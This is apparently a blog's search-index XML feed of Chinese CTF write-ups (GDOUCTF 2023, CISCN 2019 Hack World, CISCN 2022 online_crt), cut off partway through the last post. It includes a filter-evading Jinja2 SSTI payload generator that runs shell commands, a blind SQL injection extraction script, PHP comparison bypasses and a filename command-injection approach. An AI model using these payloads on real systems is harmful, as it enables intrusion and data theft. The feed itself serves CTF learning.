<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>[GDOUCTF 2023]web wp</title>
      <link href="/2023/04/17/%5BGDOUCTF%202023%5Dweb%20wp/"/>
      <url>/2023/04/17/%5BGDOUCTF%202023%5Dweb%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="GDOUCTF-2023-web-复现"><a href="#GDOUCTF-2023-web-复现" class="headerlink" title="[GDOUCTF 2023]web 复现"></a>[GDOUCTF 2023]web 复现</h1><hr><p><em>@_@</em><br><em>2023.4.17</em></p><hr><h2 id="ez-ze"><a href="#ez-ze" class="headerlink" title="ez_ze"></a>ez_ze</h2><p>判断注入<br>输入</p><pre class="line-numbers language-none"><code class="language-none">&#123;%if 1&#x3D;&#x3D;1%&#125;yes&#123;%endif%&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>返回如下<br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/%E8%BF%94%E5%9B%9E.png"><br>说明存在ssti注入</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> typing <span class="token keyword">import</span> List<span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://node6.anna.nssctf.cn:28298/get_flag"</span><span class="token keyword">def</span> <span class="token function">build_number</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>result<span class="token punctuation">:</span> List<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>index<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">while</span> num <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>n<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> num <span class="token operator">%</span> <span class="token number">10</span>result<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>num2var<span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'*ten'</span><span class="token operator">*</span>index<span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span><span class="token punctuation">)</span>num <span class="token operator">//=</span> <span class="token number">10</span>index <span class="token operator">+=</span> <span class="token number">1</span><span class="token keyword">return</span> <span class="token string">"+"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>result<span class="token punctuation">)</span>num2var_dict <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span> <span class="token string">"zero"</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span> <span class="token string">"one"</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span> <span class="token string">"two"</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">:</span> <span class="token string">"three"</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">:</span> <span class="token string">"four"</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">:</span> <span class="token string">"five"</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">:</span> <span class="token string">"six"</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">:</span> <span class="token string">"seven"</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">:</span> <span class="token string">"eight"</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">:</span> <span class="token string">"nine"</span><span class="token punctuation">&#125;</span><span class="token keyword">def</span> <span class="token function">num2var</span><span class="token punctuation">(</span>num<span class="token punctuation">:</span> <span class="token builtin">int</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">:</span><span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">"no way"</span><span class="token punctuation">)</span><span class="token keyword">return</span> num2var_dict<span class="token punctuation">[</span>num<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">build_payload</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><span class="token keyword">return</span> <span class="token triple-quoted-string string">"""&#123;% set one=(a,)|length %&#125;&#123;% set zero=one-one %&#125;&#123;% set two=one+one %&#125;&#123;% set three=one+two %&#125;&#123;% set four=two*two %&#125;&#123;% set five=three+two %&#125;&#123;% set six=three*two %&#125;&#123;% set seven=one+six %&#125;&#123;% set eight=four*two %&#125;&#123;% set nine=one+eight %&#125;&#123;% set ten=five*two %&#125;&#123;% set pops=dict(p=a,op=a)|join %&#125;&#123;% set lo=(x|reject|string|list)|attr(pops)("""</span> <span class="token operator">+</span> build_number<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")%&#125;&#123;% set init=(lo,lo,dict(ini=a,t=a)|join,lo,lo)|join %&#125;&#123;% set cc=(lo,lo,dict(glo=a,bals=a)|join,lo,lo)|join %&#125;&#123;% set ccc=(lo,lo,dict(get=a,item=a)|join,lo,lo)|join %&#125;&#123;% set cccc=(lo,lo,dict(buil=a,tins=a)|join,lo,lo)|join %&#125;&#123;% set evas=dict(ev=a,al=a)|join %&#125;&#123;% set chs=dict(ch=a,r=a)|join %&#125;&#123;% set chr=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(chs)%&#125;&#123;% set eval=a|attr(init)|attr(cc)|attr(ccc)(cccc)|attr(ccc)(evas) %&#125;&#123;% print(eval(("""</span> <span class="token operator">+</span> <span class="token string">","</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string-interpolation"><span class="token string">f"chr(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>build_number<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)"</span></span> <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token string-interpolation"><span class="token string">f"__import__('os').popen('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>command<span class="token punctuation">&#125;</span></span><span class="token string">').read()"</span></span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token triple-quoted-string string">""")|join)) %&#125;"""</span><span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>command<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span>payload <span class="token operator">=</span> build_payload<span class="token punctuation">(</span>command<span class="token punctuation">)</span>response <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"name"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span class="token comment">#return re.findall(f"h3>(.*?)&lt;/h3", response.text, re.S)[0].strip()</span>c <span class="token operator">=</span> <span class="token string">'cat /flag'</span><span class="token keyword">print</span><span class="token punctuation">(</span>run<span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到flag</p><h2 id="hate-eat-snake"><a href="#hate-eat-snake" class="headerlink" title="hate eat snake"></a>hate eat snake</h2><p>查看js，发现可以自己创造类，构造一个新的类，将速度改为0.01，运行等一会儿就出来flag了,速度值不能太小，下溢后js返回0，或一下，结果就回到10<br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/js.png"><br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/snake.png"></p><h2 id="受不了一点"><a href="#受不了一点" class="headerlink" title="受不了一点"></a>受不了一点</h2><p>源码</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type:text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&amp;&amp;</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gdou'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctf'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>           <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_COOKIE</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cookie'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string single-quoted-string">'j0k3r'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>               <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                  <span class="token variable">$aaa</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'aaa'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                  <span class="token variable">$bbb</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'bbb'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$aaa</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$bbb</span><span class="token operator">==</span><span class="token number">114514</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$aaa</span><span class="token operator">!=</span><span class="token variable">$bbb</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                   <span class="token variable">$give</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'cancanwordflag'</span><span class="token punctuation">;</span>                   <span class="token variable">$get</span> <span class="token operator">=</span><span class="token string single-quoted-string">'hacker!'</span><span class="token punctuation">;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$give</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span> <span class="token operator">||</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'flag'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'flag'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                       <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token variable">$get</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                        <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$value</span><span class="token punctuation">;</span>                   <span class="token punctuation">&#125;</span>                    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_GET</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>                         <span class="token variable">$$key</span> <span class="token operator">=</span> <span class="token variable">$$value</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>                   <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"洗洗睡吧"</span><span class="token punctuation">;</span>                 <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"行不行啊细狗"</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string single-quoted-string">'菜菜'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"就这?"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>  <span class="token keyword">echo</span> <span class="token string double-quoted-string">"别来沾边"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> 别来沾边<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>第一步为md5强相等，用数组绕过，然后需要cookie，接下来传入两个变量，变量弱相等，可以一个传114514，一个114514a，最后只要用GET和POST方法传入两个flag，且值不为flag即可<br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/bp.png"></p><h2 id="EZ-WEB"><a href="#EZ-WEB" class="headerlink" title="EZ WEB"></a>EZ WEB</h2><p>F12查看源码，发现&#x2F;src，进去得到源码<br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/src.png"><br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/%E6%BA%90%E7%A0%81%E6%B3%84%E9%9C%B2.png"><br>从源码中得到访问&#x2F;super-secret-route-nobody-will-guess，用PUT方式随意传参即可得到flag<br><img src="/2023/04/17/[GDOUCTF%202023]web%20wp/PUT.png"></p>]]></content>
      
      
      <categories>
          
          <category> GDOUCTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态网页和动态网页</title>
      <link href="/2023/04/13/%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5/"/>
      <url>/2023/04/13/%E9%9D%99%E6%80%81%E7%BD%91%E9%A1%B5%E5%92%8C%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN 2019华北Day2]Web1 hack world wp</title>
      <link href="/2023/04/12/%5BCISCN%202019%E5%8D%8E%E5%8C%97Day2%5DWeb1%20hack%20world%20wp/"/>
      <url>/2023/04/12/%5BCISCN%202019%E5%8D%8E%E5%8C%97Day2%5DWeb1%20hack%20world%20wp/</url>
      
        <content type="html"><![CDATA[<h1 id="Hack-World-write-up"><a href="#Hack-World-write-up" class="headerlink" title="Hack World write up"></a>Hack World write up</h1><hr><p><em>@_@</em><br><em>2023.4.12</em></p><hr><h2 id="一、注入类型判断"><a href="#一、注入类型判断" class="headerlink" title="一、注入类型判断"></a>一、注入类型判断</h2><p>随便输入几个数字，返回结果如下<br><img src="/2023/04/12/[CISCN%202019%E5%8D%8E%E5%8C%97Day2]Web1%20hack%20world%20wp/1%E5%9B%9E%E6%98%BE.png" alt="输入1"><br><img src="/2023/04/12/[CISCN%202019%E5%8D%8E%E5%8C%97Day2]Web1%20hack%20world%20wp/2%E5%9B%9E%E6%98%BE.png" alt="输入2"><br><img src="/2023/04/12/[CISCN%202019%E5%8D%8E%E5%8C%97Day2]Web1%20hack%20world%20wp/0%E5%9B%9E%E6%98%BE.png" alt="输入0"><br>然后尝试union联合注入，发现应该是被过滤了，反观上面的0，1有不同回显，可以尝试bool盲注<br><img src="/2023/04/12/[CISCN%202019%E5%8D%8E%E5%8C%97Day2]Web1%20hack%20world%20wp/%E8%BF%87%E6%BB%A4%E5%9B%9E%E6%98%BE.png" alt="union过滤"></p><h2 id="二、脚本分析"><a href="#二、脚本分析" class="headerlink" title="二、脚本分析"></a>二、脚本分析</h2><p>下面放上注入判断脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> timeurl <span class="token operator">=</span> <span class="token string">"http://9b8b7b53-d0de-424c-926f-1ba1204baea3.node4.buuoj.cn:81/index.php"</span>payload <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"id"</span><span class="token punctuation">:</span> <span class="token string">""</span><span class="token punctuation">&#125;</span>result <span class="token operator">=</span> <span class="token string">""</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>l <span class="token operator">=</span> <span class="token number">33</span>r <span class="token operator">=</span> <span class="token number">130</span>mid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">1</span><span class="token keyword">while</span> <span class="token punctuation">(</span> l <span class="token operator">&lt;</span> r <span class="token punctuation">)</span> <span class="token punctuation">:</span>payload<span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"0^"</span> <span class="token operator">+</span> <span class="token string">"(ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))>&#123;1&#125;)"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token comment"># ascii(substr((select(flag)from(flag)),&#123;0&#125;,1))表示取得flag数据表中的flag字段第&#123;0&#125;个字符开始的1个字符的ascll码</span>    <span class="token comment"># 如果该值比&#123;1&#125;中的值大，则返回1，否则为0</span>        <span class="token comment"># 另外，异或语句可以if代替，大同小异</span>html <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"Hello"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>    <span class="token comment"># hello是服务器端输入为1的返回值，该语句用于判断注入是否成功，表示是否为flag中字符</span>l <span class="token operator">=</span> mid<span class="token operator">+</span><span class="token number">1</span><span class="token keyword">else</span><span class="token punctuation">:</span>r <span class="token operator">=</span> midmid <span class="token operator">=</span> <span class="token punctuation">(</span>l<span class="token operator">+</span>r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token operator">==</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment">#&#125;判断flag是否结束</span><span class="token keyword">break</span>result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>mid<span class="token punctuation">)</span>result <span class="token operator">=</span> result <span class="token operator">+</span> <span class="token string">"&#125;"</span><span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行脚本，得到flag<br>NSSCTF{20e81581-6e1c-4246-a443-3fd13f82bf48}</p>]]></content>
      
      
      <categories>
          
          <category> CISCN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> ctf </tag>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于hexo搭建blog常用命令与说明</title>
      <link href="/2023/04/11/hello-world/"/>
      <url>/2023/04/11/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      <categories>
          
          <category> hexo搭建博客 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -blog搭建 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[CISCN 2022 初赛]online_crt wp</title>
      <link href="/2023/04/10/%5BCISCN%202022%20%E5%88%9D%E8%B5%9B%5Donline_crt%E5%A4%8D%E7%8E%B0/"/>
      <url>/2023/04/10/%5BCISCN%202022%20%E5%88%9D%E8%B5%9B%5Donline_crt%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="online-crt-write-up"><a href="#online-crt-write-up" class="headerlink" title="online_crt write up"></a>online_crt write up</h1><hr><p><em>@_@</em><br><em>2023.4.10</em></p><hr><h2 id="一、题目源码分析"><a href="#一、题目源码分析" class="headerlink" title="一、题目源码分析"></a>一、题目源码分析</h2><h3 id="app-py"><a href="#app-py" class="headerlink" title="app.py"></a>app.py</h3><p>附件给出app.py打开查看，发现以路由形式跳转，有一个&#x2F;getcrt生成证书，并且有一个creatlink路由下os.popen()，该代码可执行()中的shell命令，返回shell命令执行结果(<a href="https://blog.csdn.net/weixin_45839894/article/details/126158078">CVE-2022-1292</a>漏洞)<br><img src="/2023/04/10/[CISCN%202022%20%E5%88%9D%E8%B5%9B]online_crt%E5%A4%8D%E7%8E%B0/%E6%BC%8F%E6%B4%9E.png"><br>具体运行过程如下：<br>1.运行 c_rehash static&#x2F;crt&#x2F; 命令，其中 static&#x2F;crt&#x2F; 是 c_rehash 命令需要处理的证书存储目录。这个命令会重新 “哈希” 指定目录下的所有 PEM 格式证书文件，以便 SSL 应用程序能够使用它们（更具体地说，它会生成一个包含一组指向每个证书文件的符号链接的新目录 hashdir）。</p><p>2.然后运行 ls static&#x2F;crt&#x2F; 命令，以列出经过重新哈希的证书目录中的所有文件名。</p><p>3.最终 .read() 方法将读取整个 shell 命令的任何输出，并作为字符串返回给调用方。<br>我们可以将读取flag文件的命令伪造成一个文件名，接下来是要找一个可以伪造文件名的路由，这个在题目给的go文件中，我们先把app.py看完，再往后看，发现有一个crlf漏洞可利用，可以利用这个更改请求包<br><img src="/2023/04/10/[CISCN%202022%20%E5%88%9D%E8%B5%9B]online_crt%E5%A4%8D%E7%8E%B0/crlf.png"></p><h3 id="main-go"><a href="#main-go" class="headerlink" title="main.go"></a>main.go</h3><p>查看main.go,发现以admin身份可以更改已有证书名</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">package</span> main<span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"github.com/gin-gonic/gin"</span><span class="token string">"os"</span><span class="token string">"strings"</span><span class="token punctuation">)</span><span class="token keyword">func</span> <span class="token function">admin</span><span class="token punctuation">(</span>c <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>staticPath <span class="token operator">:=</span> <span class="token string">"/app/static/crt/"</span>oldname <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"oldname"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span>newname <span class="token operator">:=</span> c<span class="token punctuation">.</span><span class="token function">DefaultQuery</span><span class="token punctuation">(</span><span class="token string">"newname"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token keyword">if</span> oldname <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> newname <span class="token operator">==</span> <span class="token string">""</span> <span class="token operator">||</span> strings<span class="token punctuation">.</span><span class="token function">Contains</span><span class="token punctuation">(</span>oldname<span class="token 